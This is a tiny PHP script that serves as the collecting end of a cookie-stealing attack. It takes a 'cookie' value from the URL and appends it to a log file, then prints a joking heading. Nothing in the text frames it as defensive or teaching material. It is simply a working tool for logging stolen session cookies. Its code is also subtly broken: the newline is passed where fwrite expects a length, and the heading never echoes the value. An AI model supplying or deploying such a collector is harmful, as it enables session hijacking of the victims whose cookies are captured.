<?php
$cookie = $_GET["cookie"];
$file = fopen('logfile.txt', 'a');
fwrite($file, $cookie, "\n");
?>

<h1>cookie has following ingredient(s): <?php $cookie ?> </h1>
